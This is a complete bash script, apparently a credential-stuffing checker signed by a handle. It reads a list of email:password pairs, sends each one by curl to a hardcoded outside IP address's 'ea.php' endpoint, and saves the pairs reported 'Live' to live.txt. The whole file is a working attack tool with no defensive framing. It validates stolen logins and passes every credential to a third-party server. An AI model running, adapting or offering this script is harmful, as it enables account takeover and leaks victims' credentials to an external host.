#!/bin/bash
#coded By ./MimiUndetected
NC='\033[0m'
GREEN='\e[38;5;82m'
CYAN='\e[38;5;45m'
RED='\e[38;5;196m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
login(){
        curl -s "178.128.62.17/ea.php?empass=$1"
}
echo " Delimeter List | "
read -p 'empass : ' list
IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($(cat $list))'
for (( i = 0; i < "${#email[@]}"; i++ )); do
    user="${email[$i]}"
echo -n "[$i/${#email[@]}]-"
e=$(login $user)
if [[ "$e" =~ "Live" ]]; then
 printf "[${CYAN}LIVE${NC}]-[${CYAN}$user${NC}]\n"
 echo $user >> live.txt
else
printf "[${RED}DIE${NC}]-[${RED}$user${NC}]\n"
fi
done
